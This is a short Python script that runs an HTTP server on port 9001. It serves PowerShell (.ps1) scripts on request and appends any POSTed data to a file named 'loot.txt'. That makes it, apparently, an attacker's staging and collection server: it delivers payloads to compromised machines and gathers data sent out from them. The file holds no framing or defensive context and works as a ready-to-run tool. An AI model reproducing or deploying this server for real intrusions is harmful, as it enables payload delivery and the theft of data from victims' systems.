import http.server
import socketserver
import sys

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        with open("loot.txt", "ab") as file:  # Open as binary ('ab') mode
            file.write(post_data)
            file.write(b"\n")

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Data appended to loot.txt\n")

    def do_GET(self):
        if self.path.endswith('.ps1'):
            script_name = self.path[1:]
            try:
                with open(script_name, "rb") as file:  # Open as binary ('rb') mode
                    self.send_response(200)
                    self.send_header("Content-type", "application/octet-stream")
                    self.end_headers()
                    self.wfile.write(file.read())  # Read and serve as binary
            except FileNotFoundError:
                self.send_response(404)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(b"Script not found\n")
        else:
            super().do_GET()

    def address_string(self):
        # Override the default address_string method to display the client's IP address
        host, port = self.client_address
        return f"{host}"

PORT = 9001

try:
    with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
        print(f"Server listening on port {PORT}")
        httpd.serve_forever()
except OSError as e:
    if e.errno == 98:
        print(f"Port {PORT} is already in use. Exiting...")
    else:
        print(f"Error: {e}")
except KeyboardInterrupt:
    print("Server terminated by user.")
    sys.exit(0)
